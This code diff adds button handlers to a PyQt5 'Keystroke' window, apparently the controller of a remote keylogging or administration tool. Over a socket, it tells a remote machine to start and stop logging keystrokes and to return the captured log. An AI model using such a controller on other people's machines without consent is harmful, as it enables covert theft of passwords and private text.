@@ -10,8 +10,10 @@ from PyQt5.QtWidgets import (
 
 class Keystroke(QWidget):
 
-    def __init__(self):
+    def __init__(self, socket):
         super().__init__()
+
+        self.socket = socket
 
         self.initUI()
 
@@ -38,9 +40,13 @@ class Keystroke(QWidget):
         hbox1 = QHBoxLayout()
 
         hook_button = QPushButton('Hook')
+        hook_button.clicked.connect(self.hook)
         unhook_button = QPushButton('Unhook')
+        unhook_button.clicked.connect(self.unhook)
         print_button = QPushButton('In Phím')
+        print_button.clicked.connect(self.print)
         delete_button = QPushButton('Xóa')
+        delete_button.clicked.connect(self.delete)
 
         hbox1.addWidget(hook_button)
         hbox1.addWidget(unhook_button)
@@ -56,3 +62,19 @@ class Keystroke(QWidget):
         self.setLayout(vbox1)
         self.setWindowTitle('Keystroke')
         self.show()
+
+    def hook(self):
+        self.socket.send(bytes('key_log_listening', 'utf-8'))
+
+    def unhook(self):
+        self.socket.send(bytes('key_log_stop_listening', 'utf-8'))
+
+    def print(self):
+        self.socket.send(bytes('get_key_log', 'utf-8'))
+
+        data = self.socket.recv(2048).decode("utf-8")
+
+        self.textEdit.setPlainText(data)
+
+    def delete(self):
+        self.textEdit.setPlainText("")
